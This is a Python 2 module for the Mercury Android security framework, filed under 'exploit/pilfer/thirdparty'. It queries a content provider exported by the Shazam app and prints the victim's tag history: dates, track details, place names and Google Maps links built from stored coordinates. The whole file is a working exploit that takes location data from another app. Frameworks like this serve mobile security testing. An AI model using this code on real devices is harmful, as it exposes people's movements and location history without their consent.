from merc.lib.modules import Module

class ShazamGPS(Module):
    """Description: I know where you were when you liked that song with Shazam!
https://play.google.com/store/apps/details?id=com.shazam.android
Credit: Anon"""

    def __init__(self, *args, **kwargs):
        Module.__init__(self, *args, **kwargs)
        self.path = ["exploit", "pilfer", "thirdparty"]

    def execute(self, session, _arg):

        request = {}
        request['Uri'] = "content://com.shazam.library.providers.freeimporttagscontentprovider"
        request['showColumns'] = "false"
        
        results = session.executeCommand("provider", "query", request).data
        
        split_results = results.split("\n")
        for nr in split_results:
            if nr != "":
                column_results = nr.split(" | ")
                print "Date and Time: " + column_results[5] 
                print "Track Title  : " + column_results[7] 
                print "Album        : " + column_results[8] 
                print "Artist       : " + column_results[9] 
                print "Location     : " + column_results[19] 
                print "Google Map Location: http://maps.google.com/maps?q=" + column_results[16] + "," + column_results[17]
                print "" 
